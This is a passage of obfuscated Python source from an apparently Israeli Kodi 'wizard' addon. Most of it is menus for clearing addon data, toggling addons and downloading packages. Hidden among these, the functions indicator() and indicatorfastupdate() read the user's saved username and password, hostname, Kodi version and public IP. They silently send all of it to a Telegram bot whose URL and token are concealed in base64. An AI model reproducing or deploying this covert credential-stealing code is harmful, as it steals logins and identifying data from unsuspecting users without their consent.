		else :O00O0000000OOOO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3729
		if O00O0000000OOOO0O ==1 :wiz .reloadFix ('remove addon')#line:3730
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3731
def removeAddonDataMenu ():#line:3733
	if os .path .exists (ADDOND ):#line:3734
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3735
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3736
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3737
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3738
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3739
		OO0O0OOOOOOO00O00 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3740
		for O0O000O0OO0000O0O in sorted (OO0O0OOOOOOO00O00 ,key =lambda OO00OOO0000OO0O00 :OO00OOO0000OO0O00 ):#line:3741
			O0O0OOO00OOO0OOO0 =O0O000O0OO0000O0O .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3742
			OOO0OOO0OO0O00OOO =os .path .join (O0O000O0OO0000O0O .replace (ADDOND ,ADDONS ),'icon.png')#line:3743
			O0000OOO0OOOO00O0 =os .path .join (O0O000O0OO0000O0O .replace (ADDOND ,ADDONS ),'fanart.png')#line:3744
			O0OO0O000OOOOOOO0 =O0O0OOO00OOO0OOO0 #line:3745
			O0OO00O0O000OOO00 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3746
			for OO000O0000000OOO0 in O0OO00O0O000OOO00 :#line:3747
				O0OO0O000OOOOOOO0 =O0OO0O000OOOOOOO0 .replace (OO000O0000000OOO0 ,O0OO00O0O000OOO00 [OO000O0000000OOO0 ])#line:3748
			if O0O0OOO00OOO0OOO0 in EXCLUDES :O0OO0O000OOOOOOO0 ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O0OO0O000OOOOOOO0 #line:3749
			else :O0OO0O000OOOOOOO0 ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O0OO0O000OOOOOOO0 #line:3750
			addFile (' %s'%O0OO0O000OOOOOOO0 ,'removedata',O0O0OOO00OOO0OOO0 ,icon =OOO0OOO0OO0O00OOO ,fanart =O0000OOO0OOOO00O0 ,themeit =THEME2 )#line:3751
	else :#line:3752
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3753
	setView ('files','viewType')#line:3754
def enableAddons ():#line:3756
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3757
	OOO000O000OOOO00O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3758
	O0OOOOOO00O0OO0O0 =0 #line:3759
	for OOO0O00000000O0OO in sorted (OOO000O000OOOO00O ,key =lambda OOO00000O000OO000 :OOO00000O000OO000 ):#line:3760
		OO00O0OOO00O00O0O =os .path .split (OOO0O00000000O0OO [:-1 ])[1 ]#line:3761
		if OO00O0OOO00O00O0O in EXCLUDES :continue #line:3762
		if OO00O0OOO00O00O0O in DEFAULTPLUGINS :continue #line:3763
		O00O000O00OOOOO0O =os .path .join (OOO0O00000000O0OO ,'addon.xml')#line:3764
		if os .path .exists (O00O000O00OOOOO0O ):#line:3765
			O0OOOOOO00O0OO0O0 +=1 #line:3766
			OOO000O000OOOO00O =OOO0O00000000O0OO .replace (ADDONS ,'')[1 :-1 ]#line:3767
			OO00O0OO0000OOOOO =open (O00O000O00OOOOO0O )#line:3768
			O0O00O00O00O00OOO =OO00O0OO0000OOOOO .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3769
			OO00O00O00OOO000O =wiz .parseDOM (O0O00O00O00O00OOO ,'addon',ret ='id')#line:3770
			OO0O0000O000OOO0O =wiz .parseDOM (O0O00O00O00O00OOO ,'addon',ret ='name')#line:3771
			try :#line:3772
				O00OOOOO0O0O000OO =OO00O00O00OOO000O [0 ]#line:3773
				OOO0O0O0OOO00000O =OO0O0000O000OOO0O [0 ]#line:3774
			except :#line:3775
				continue #line:3776
			try :#line:3777
				OOO000O00OO0O0000 =xbmcaddon .Addon (id =O00OOOOO0O0O000OO )#line:3778
				O000OOOOO0O00O0O0 ="[COLOR green][Enabled][/COLOR]"#line:3779
				O00000OOO00O00000 ="false"#line:3780
			except :#line:3781
				O000OOOOO0O00O0O0 ="[COLOR red][Disabled][/COLOR]"#line:3782
				O00000OOO00O00000 ="true"#line:3783
				pass #line:3784
			OOOOO0OOO00O00000 =os .path .join (OOO0O00000000O0OO ,'icon.png')if os .path .exists (os .path .join (OOO0O00000000O0OO ,'icon.png'))else ICON #line:3785
			OO0OO0OOOO000O000 =os .path .join (OOO0O00000000O0OO ,'fanart.jpg')if os .path .exists (os .path .join (OOO0O00000000O0OO ,'fanart.jpg'))else FANART #line:3786
			addFile ("%s %s"%(O000OOOOO0O00O0O0 ,OOO0O0O0OOO00000O ),'toggleaddon',OOO000O000OOOO00O ,O00000OOO00O00000 ,icon =OOOOO0OOO00O00000 ,fanart =OO0OO0OOOO000O000 )#line:3787
			OO00O0OO0000OOOOO .close ()#line:3788
	if O0OOOOOO00O0OO0O0 ==0 :#line:3789
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3790
	setView ('files','viewType')#line:3791
def changeFeq ():#line:3793
	O000O00000O0O0O0O =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3794
	O0O00O0O0O0OO0OOO =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O000O00000O0O0O0O )#line:3795
	if not O0O00O0O0O0OO0OOO ==-1 :#line:3796
		wiz .setS ('autocleanfeq',str (O0O00O0O0O0OO0OOO ))#line:3797
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O000O00000O0O0O0O [O0O00O0O0O0OO0OOO ]))#line:3798
def developer ():#line:3800
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3801
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3802
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3803
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3804
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3805
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3806
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3807
	setView ('files','viewType')#line:3809
def download (OO0O00O0O0OOOOOO0 ,OO000OO0O00O0O00O ):#line:3814
  OO000O00O000OO000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3815
  OOO00000OOO00OOOO =xbmcgui .DialogProgress ()#line:3816
  OOO00000OOO00OOOO .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3817
  O0000O000O00OOO00 =os .path .join (OO000O00O000OO000 ,'isr.zip')#line:3818
  O0O0000OOOOOOOO00 =urllib2 .Request (OO0O00O0O0OOOOOO0 )#line:3819
  O0OOO0O0OO00OO000 =urllib2 .urlopen (O0O0000OOOOOOOO00 )#line:3820
  OOOOOOOOOO0O0OOOO =xbmcgui .DialogProgress ()#line:3822
  OOOOOOOOOO0O0OOOO .create ("Downloading","Downloading "+name )#line:3823
  OOOOOOOOOO0O0OOOO .update (0 )#line:3824
  O0OO000O000O0000O =OO000OO0O00O0O00O #line:3825
  O0OO00O0O0O0OOO00 =open (O0000O000O00OOO00 ,'wb')#line:3826
  try :#line:3828
    O00O0O0O0OOO00O0O =O0OOO0O0OO00OO000 .info ().getheader ('Content-Length').strip ()#line:3829
    OOOOOOO0O0O00OOOO =True #line:3830
  except AttributeError :#line:3831
        OOOOOOO0O0O00OOOO =False #line:3832
  if OOOOOOO0O0O00OOOO :#line:3834
        O00O0O0O0OOO00O0O =int (O00O0O0O0OOO00O0O )#line:3835
  OOO000O0O00OO0OO0 =0 #line:3837
  OO000O0O0OOOOO000 =time .time ()#line:3838
  while True :#line:3839
        O000OO00000OOO0O0 =O0OOO0O0OO00OO000 .read (8192 )#line:3840
        if not O000OO00000OOO0O0 :#line:3841
            sys .stdout .write ('\n')#line:3842
            break #line:3843
        OOO000O0O00OO0OO0 +=len (O000OO00000OOO0O0 )#line:3845
        O0OO00O0O0O0OOO00 .write (O000OO00000OOO0O0 )#line:3846
        if not OOOOOOO0O0O00OOOO :#line:3848
            O00O0O0O0OOO00O0O =OOO000O0O00OO0OO0 #line:3849
        if OOOOOOOOOO0O0OOOO .iscanceled ():#line:3850
           OOOOOOOOOO0O0OOOO .close ()#line:3851
           try :#line:3852
            os .remove (O0000O000O00OOO00 )#line:3853
           except :#line:3854
            pass #line:3855
           break #line:3856
        OO00O0O0OO0OOOOOO =float (OOO000O0O00OO0OO0 )/O00O0O0O0OOO00O0O #line:3857
        OO00O0O0OO0OOOOOO =round (OO00O0O0OO0OOOOOO *100 ,2 )#line:3858
        O000OO0O00OO00000 =OOO000O0O00OO0OO0 /(1024 *1024 )#line:3859
        OOOO0OOOOOO00OO00 =O00O0O0O0OOO00O0O /(1024 *1024 )#line:3860
        OO0O0OOO00O000OOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O000OO0O00OO00000 ,'teal',OOOO0OOOOOO00OO00 )#line:3861
        if (time .time ()-OO000O0O0OOOOO000 )>0 :#line:3862
          OOOOO00O0O0O0OOO0 =OOO000O0O00OO0OO0 /(time .time ()-OO000O0O0OOOOO000 )#line:3863
          OOOOO00O0O0O0OOO0 =OOOOO00O0O0O0OOO0 /1024 #line:3864
        else :#line:3865
         OOOOO00O0O0O0OOO0 =0 #line:3866
        OOOOOO0O00OOOOO0O ='KB'#line:3867
        if OOOOO00O0O0O0OOO0 >=1024 :#line:3868
           OOOOO00O0O0O0OOO0 =OOOOO00O0O0O0OOO0 /1024 #line:3869
           OOOOOO0O00OOOOO0O ='MB'#line:3870
        if OOOOO00O0O0O0OOO0 >0 and not OO00O0O0OO0OOOOOO ==100 :#line:3871
            OOOOOO0OO0OOO0000 =(O00O0O0O0OOO00O0O -OOO000O0O00OO0OO0 )/OOOOO00O0O0O0OOO0 #line:3872
        else :#line:3873
            OOOOOO0OO0OOO0000 =0 #line:3874
        OOOO000OOO0O00O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOO00O0O0O0OOO0 ,OOOOOO0O00OOOOO0O )#line:3875
        OOOOOOOOOO0O0OOOO .update (int (OO00O0O0OO0OOOOOO ),"Downloading "+name ,OO0O0OOO00O000OOO ,OOOO000OOO0O00O00 )#line:3877
  O0OOOO000000O000O =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3880
  O0OO00O0O0O0OOO00 .close ()#line:3882
  extract (O0000O000O00OOO00 ,O0OOOO000000O000O ,OOOOOOOOOO0O0OOOO )#line:3884
  if os .path .exists (O0OOOO000000O000O +'/scakemyer-script.quasar.burst'):#line:3885
    if os .path .exists (O0OOOO000000O000O +'/script.quasar.burst'):#line:3886
     shutil .rmtree (O0OOOO000000O000O +'/script.quasar.burst',ignore_errors =False )#line:3887
    os .rename (O0OOOO000000O000O +'/scakemyer-script.quasar.burst',O0OOOO000000O000O +'/script.quasar.burst')#line:3888
  if os .path .exists (O0OOOO000000O000O +'/plugin.video.kmediatorrent-master'):#line:3890
    if os .path .exists (O0OOOO000000O000O +'/plugin.video.kmediatorrent'):#line:3891
     shutil .rmtree (O0OOOO000000O000O +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3892
    os .rename (O0OOOO000000O000O +'/plugin.video.kmediatorrent-master',O0OOOO000000O000O +'/plugin.video.kmediatorrent')#line:3893
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3894
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3895
  try :#line:3896
    os .remove (O0000O000O00OOO00 )#line:3897
  except :#line:3898
    pass #line:3899
  OOOOOOOOOO0O0OOOO .close ()#line:3900
def dis_or_enable_addon (O0OO0O0000000O00O ,O00OO000OOOOOO00O ,enable ="true"):#line:3901
    import json #line:3902
    OOO0OOOOOOOO0OOO0 ='"%s"'%O0OO0O0000000O00O #line:3903
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OO0O0000000O00O )and enable =="true":#line:3904
        logging .warning ('already Enabled')#line:3905
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0OO0O0000000O00O )#line:3906
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OO0O0000000O00O )and enable =="false":#line:3907
        return xbmc .log ("### Skipped %s, reason = not installed"%O0OO0O0000000O00O )#line:3908
    else :#line:3909
        OO00O000OOO0O0000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OOO0OOOOOOOO0OOO0 ,enable )#line:3910
        O0OO00000O0O0O0OO =xbmc .executeJSONRPC (OO00O000OOO0O0000 )#line:3911
        OOOOOO0OO0OO000O0 =json .loads (O0OO00000O0O0O0OO )#line:3912
        if enable =="true":#line:3913
            xbmc .log ("### Enabled %s, response = %s"%(O0OO0O0000000O00O ,OOOOOO0OO0OO000O0 ))#line:3914
        else :#line:3915
            xbmc .log ("### Disabled %s, response = %s"%(O0OO0O0000000O00O ,OOOOOO0OO0OO000O0 ))#line:3916
    if O00OO000OOOOOO00O =='auto':#line:3917
     return True #line:3918
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3919
def chunk_report (OOO000OOO0OO00OOO ,O00O00O0OO00OO000 ,OOO000O0OO0O0OO00 ):#line:3920
   OO0OOO0000O000OO0 =float (OOO000OOO0OO00OOO )/OOO000O0OO0O0OO00 #line:3921
   OO0OOO0000O000OO0 =round (OO0OOO0000O000OO0 *100 ,2 )#line:3922
   if OOO000OOO0OO00OOO >=OOO000O0OO0O0OO00 :#line:3924
      sys .stdout .write ('\n')#line:3925
def chunk_read (OOOO0OO0OOO00OOO0 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3927
   import time #line:3928
   O0O000O0000OO00OO =int (filesize )*1000000 #line:3929
   OOO00OOOOO00O0OOO =0 #line:3931
   OOOOOOOOO0O000000 =time .time ()#line:3932
   OOO0OO0O00OO0OOO0 =0 #line:3933
   logging .warning ('Downloading')#line:3935
   with open (destination ,"wb")as OO0000OO0O000OOO0 :#line:3936
    while 1 :#line:3937
      OOOO0O00OO0O00OOO =time .time ()-OOOOOOOOO0O000000 #line:3938
      OO0000O0OO0000OO0 =int (OOO0OO0O00OO0OOO0 *chunk_size )#line:3939
      OO0OO0OO0O0O000OO =OOOO0OO0OOO00OOO0 .read (chunk_size )#line:3940
      OO0000OO0O000OOO0 .write (OO0OO0OO0O0O000OO )#line:3941
      OO0000OO0O000OOO0 .flush ()#line:3942
      OOO00OOOOO00O0OOO +=len (OO0OO0OO0O0O000OO )#line:3943
      O0O000O00O000OOO0 =float (OOO00OOOOO00O0OOO )/O0O000O0000OO00OO #line:3944
      O0O000O00O000OOO0 =round (O0O000O00O000OOO0 *100 ,2 )#line:3945
      if int (OOOO0O00OO0O00OOO )>0 :#line:3946
        OO0OOO0000000000O =int (OO0000O0OO0000OO0 /(1024 *OOOO0O00OO0O00OOO ))#line:3947
      else :#line:3948
         OO0OOO0000000000O =0 #line:3949
      if OO0OOO0000000000O >1024 and not O0O000O00O000OOO0 ==100 :#line:3950
          O0000O000OOO0OOOO =int (((O0O000O0000OO00OO -OO0000O0OO0000OO0 )/1024 )/(OO0OOO0000000000O ))#line:3951
      else :#line:3952
          O0000O000OOO0OOOO =0 #line:3953
      if O0000O000OOO0OOOO <0 :#line:3954
        O0000O000OOO0OOOO =0 #line:3955
      dp .update (int (O0O000O00O000OOO0 ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0O000O00O000OOO0 ,OO0000O0OO0000OO0 /(1024 *1024 ),O0O000O0000OO00OO /(1000 *1000 ),OO0OOO0000000000O ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (O0000O000OOO0OOOO ,60 ))#line:3956
      if dp .iscanceled ():#line:3957
         dp .close ()#line:3958
         break #line:3959
      if not OO0OO0OO0O0O000OO :#line:3960
         break #line:3961
      if report_hook :#line:3963
         report_hook (OOO00OOOOO00O0OOO ,chunk_size ,O0O000O0000OO00OO )#line:3964
      OOO0OO0O00OO0OOO0 +=1 #line:3965
   logging .warning ('END Downloading')#line:3966
   return OOO00OOOOO00O0OOO #line:3967
def googledrive_download (OO0OOOO0O00O0O0OO ,OO00OO000OOO00O00 ,OOOO000O000O0000O ,OOO000O0O0000OO00 ):#line:3969
    O000O00O0000OOOOO =[]#line:3973
    O000O0OO000O00000 =OO0OOOO0O00O0O0OO .split ('=')#line:3974
    OO0OOOO0O00O0O0OO =O000O0OO000O00000 [len (O000O0OO000O00000 )-1 ]#line:3975
    def OO00O0O00OOOO0000 (O000OOOOO0000O0OO ):#line:3977
        for O0000OO0OO0O0000O in O000OOOOO0000O0OO :#line:3979
            logging .warning ('cookie.name')#line:3980
            logging .warning (O0000OO0OO0O0000O .name )#line:3981
            O0000000000O00O00 =O0000OO0OO0O0000O .value #line:3982
            if 'download_warning'in O0000OO0OO0O0000O .name :#line:3983
                logging .warning (O0000OO0OO0O0000O .value )#line:3984
                logging .warning ('cookie.value')#line:3985
                return O0000OO0OO0O0000O .value #line:3986
            return O0000000000O00O00 #line:3987
        return None #line:3989
    def OO0OOOO0O0OOOOOO0 (OOOOO0000OO00O0OO ,O000OOO0OOO0O0O00 ):#line:3991
        O0OOO0OOOO0O0OOO0 =32768 #line:3993
        OOOO0O0O0OOO0000O =time .time ()#line:3994
        with open (O000OOO0OOO0O0O00 ,"wb")as O000O00OO00O00O00 :#line:3996
            OOOO000OOO00000OO =1 #line:3997
            OOO00O0OOOOOO0000 =32768 #line:3998
            try :#line:3999
                OOOO0O00O0O0OO0OO =int (OOOOO0000OO00O0OO .headers .get ('content-length'))#line:4000
                print ('file total size :',OOOO0O00O0O0OO0OO )#line:4001
            except TypeError :#line:4002
                print ('using dummy length !!!')#line:4003
                OOOO0O00O0O0OO0OO =int (OOO000O0O0000OO00 )*1000000 #line:4004
            for OO0O0OOO0O00OOOO0 in OOOOO0000OO00O0OO .iter_content (O0OOO0OOOO0O0OOO0 ):#line:4005
                if OO0O0OOO0O00OOOO0 :#line:4006
                    O000O00OO00O00O00 .write (OO0O0OOO0O00OOOO0 )#line:4007
                    O000O00OO00O00O00 .flush ()#line:4008
                    OOO000000O000O0OO =time .time ()-OOOO0O0O0OOO0000O #line:4009
                    OOO0OO000OOO000OO =int (OOOO000OOO00000OO *OOO00O0OOOOOO0000 )#line:4010
                    if OOO000000O000O0OO ==0 :#line:4011
                        OOO000000O000O0OO =0.1 #line:4012
                    OOOO0OOOO0OOO00OO =int (OOO0OO000OOO000OO /(1024 *OOO000000O000O0OO ))#line:4013
                    O000OOOO0000OOOOO =int (OOOO000OOO00000OO *OOO00O0OOOOOO0000 *100 /OOOO0O00O0O0OO0OO )#line:4014
                    if OOOO0OOOO0OOO00OO >1024 and not O000OOOO0000OOOOO ==100 :#line:4015
                      OO0OO0OOOOOOO0OO0 =int (((OOOO0O00O0O0OO0OO -OOO0OO000OOO000OO )/1024 )/(OOOO0OOOO0OOO00OO ))#line:4016
                    else :#line:4017
                      OO0OO0OOOOOOO0OO0 =0 #line:4018
                    OOOO000O000O0000O .update (int (O000OOOO0000OOOOO ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O000OOOO0000OOOOO ,OOO0OO000OOO000OO /(1024 *1024 ),OOOO0O00O0O0OO0OO /(1000 *1000 ),OOOO0OOOO0OOO00OO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO0OO0OOOOOOO0OO0 ,60 ))#line:4020
                    OOOO000OOO00000OO +=1 #line:4021
                    if OOOO000O000O0000O .iscanceled ():#line:4022
                     OOOO000O000O0000O .close ()#line:4023
                     break #line:4024
    O0O00OOO0O00O0O0O ="https://docs.google.com/uc?export=download"#line:4025
    import urllib2 #line:4030
    import cookielib #line:4031
    from cookielib import CookieJar #line:4033
    O0OO0OOO0O0OO000O =CookieJar ()#line:4035
    OOO0OOO0OOO00O00O =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0OO0OOO0O0OO000O ))#line:4036
    OOO0000OO0OOO000O ={'id':OO0OOOO0O00O0O0OO }#line:4038
    O0O00O0O0O0000OOO =urllib .urlencode (OOO0000OO0OOO000O )#line:4039
    logging .warning (O0O00OOO0O00O0O0O +'&'+O0O00O0O0O0000OOO )#line:4040
    O00OO00O000OOO0OO =OOO0OOO0OOO00O00O .open (O0O00OOO0O00O0O0O +'&'+O0O00O0O0O0000OOO )#line:4041
    OOOO00OO00O000000 =O00OO00O000OOO0OO .read ()#line:4042
    for OOO0O000OOO00OO0O in O0OO0OOO0O0OO000O :#line:4044
         logging .warning (OOO0O000OOO00OO0O )#line:4045
    OO000OOOO00O0OO0O =OO00O0O00OOOO0000 (O0OO0OOO0O0OO000O )#line:4046
    logging .warning (OO000OOOO00O0OO0O )#line:4047
    if OO000OOOO00O0OO0O :#line:4048
        O0OO000O000OO0O00 ={'id':OO0OOOO0O00O0O0OO ,'confirm':OO000OOOO00O0OO0O }#line:4049
        OO0OO0OO000O000OO ={'Access-Control-Allow-Headers':'Content-Length'}#line:4050
        O0O00O0O0O0000OOO =urllib .urlencode (O0OO000O000OO0O00 )#line:4051
        O00OO00O000OOO0OO =OOO0OOO0OOO00O00O .open (O0O00OOO0O00O0O0O +'&'+O0O00O0O0O0000OOO )#line:4052
        chunk_read (O00OO00O000OOO0OO ,report_hook =chunk_report ,dp =OOOO000O000O0000O ,destination =OO00OO000OOO00O00 ,filesize =OOO000O0O0000OO00 )#line:4053
    return (O000O00O0000OOOOO )#line:4057
def kodi17Fix ():#line:4058
	OOOOO0O0OO0O0O000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:4059
	O0OO0OO0O000OO00O =[]#line:4060
	for OOO0000000O0OOOOO in sorted (OOOOO0O0OO0O0O000 ,key =lambda OO0O0OOOO0OOO000O :OO0O0OOOO0OOO000O ):#line:4061
		O000O0OOOOO0O0O0O =os .path .join (OOO0000000O0OOOOO ,'addon.xml')#line:4062
		if os .path .exists (O000O0OOOOO0O0O0O ):#line:4063
			O0000O0OOOO00OOO0 =OOO0000000O0OOOOO .replace (ADDONS ,'')[1 :-1 ]#line:4064
			OOOOOOO0O0O000000 =open (O000O0OOOOO0O0O0O )#line:4065
			OOOOO0000OO0OOOO0 =OOOOOOO0O0O000000 .read ()#line:4066
			OO0O0O0OO00O00O0O =parseDOM (OOOOO0000OO0OOOO0 ,'addon',ret ='id')#line:4067
			OOOOOOO0O0O000000 .close ()#line:4068
			try :#line:4069
				O0OO00OO0O0O0O0OO =xbmcaddon .Addon (id =OO0O0O0OO00O00O0O [0 ])#line:4070
			except :#line:4071
				try :#line:4072
					log ("%s was disabled"%OO0O0O0OO00O00O0O [0 ],xbmc .LOGDEBUG )#line:4073
					O0OO0OO0O000OO00O .append (OO0O0O0OO00O00O0O [0 ])#line:4074
				except :#line:4075
					try :#line:4076
						log ("%s was disabled"%O0000O0OOOO00OOO0 ,xbmc .LOGDEBUG )#line:4077
						O0OO0OO0O000OO00O .append (O0000O0OOOO00OOO0 )#line:4078
					except :#line:4079
						if len (OO0O0O0OO00O00O0O )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O0000O0OOOO00OOO0 ,xbmc .LOGERROR )#line:4080
						else :log ("Unabled to enable: %s"%OOO0000000O0OOOOO ,xbmc .LOGERROR )#line:4081
	if len (O0OO0OO0O000OO00O )>0 :#line:4082
		OO0O0OOOO0O0OO00O =0 #line:4083
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:4084
		for O0OOOO0OO0OO00OO0 in O0OO0OO0O000OO00O :#line:4085
			OO0O0OOOO0O0OO00O +=1 #line:4086
			O0OOOOO0OO0O0O0O0 =int (percentage (OO0O0OOOO0O0OO00O ,len (O0OO0OO0O000OO00O )))#line:4087
			DP .update (O0OOOOO0OO0O0O0O0 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOOO0OO0OO00OO0 ))#line:4088
			addonDatabase (O0OOOO0OO0OO00OO0 ,1 )#line:4089
			if DP .iscanceled ():break #line:4090
		if DP .iscanceled ():#line:4091
			DP .close ()#line:4092
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:4093
			sys .exit ()#line:4094
		DP .close ()#line:4095
	forceUpdate ()#line:4096
def indicator ():#line:4098
       try :#line:4099
          import json #line:4100
          wiz .log ('FRESH MESSAGE')#line:4101
          OO00O0OO00O0O0O0O =(ADDON .getSetting ("user"))#line:4102
          OO0OO0O0OOO00OO0O =(ADDON .getSetting ("pass"))#line:4103
          OOOOO00O0OO00O000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:4104
          O000O000O000OO0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:4105
          OO000OO0OO000OO00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:4106
          O0OO0O0OO0OO000O0 =str (json .loads (OO000OO0OO000OO00 )['ip'])#line:4107
          O0OOOO0OO0OOOO000 =OO00O0OO00O0O0O0O #line:4108
          OOO00OO0OOO0O000O =OO0OO0O0OOO00OO0O #line:4109
          import socket #line:4110
          OO000OO0OO000OO00 =urllib2 .urlopen (O000O000O000OO0OO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0OOOO0OO0OOOO000 +' - '+OOO00OO0OOO0O000O +' - '+OOOOO00O0OO00O000 +' - '+O0OO0O0OO0OO000O0 ).readlines ()#line:4111
       except :pass #line:4113
def indicatorfastupdate ():#line:4115
       try :#line:4116
          import json #line:4117
          wiz .log ('FRESH MESSAGE')#line:4118
          OOOOOOO0000O00O0O =(ADDON .getSetting ("user"))#line:4119
          OOOOOO0OO0O0O0O0O =(ADDON .getSetting ("pass"))#line:4120
          O0OOOOO0O00OOO0OO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:4121
          OOO00O000OOOO000O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:4123
          O0OO0O0OOO0OO0OO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:4124
          OOO0OO0OO0OOOOO00 =str (json .loads (O0OO0O0OOO0OO0OO0 )['ip'])#line:4125
          O0O0000OO0O000OOO =OOOOOOO0000O00O0O #line:4126
          OO0OOO0000OO0O00O =OOOOOO0OO0O0O0O0O #line:4127
          import socket #line:4129
          O0OO0O0OOO0OO0OO0 =urllib2 .urlopen (OOO00O000OOOO000O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0O0000OO0O000OOO +' - '+OO0OOO0000OO0O00O +' - '+O0OOOOO0O00OOO0OO +' - '+OOO0OO0OO0OOOOO00 ).readlines ()#line:4130
       except :pass #line:4132
def skinfix18 ():#line:4134
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:4135
		OO00O0OO0OOO00O0O =wiz .workingURL (SKINID18DDONXML )#line:4136
		if OO00O0OO0OOO00O0O ==True :#line:4137
			O000O00O00000OO00 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:4138
			if len (O000O00O00000OO00 )>0 :#line:4139
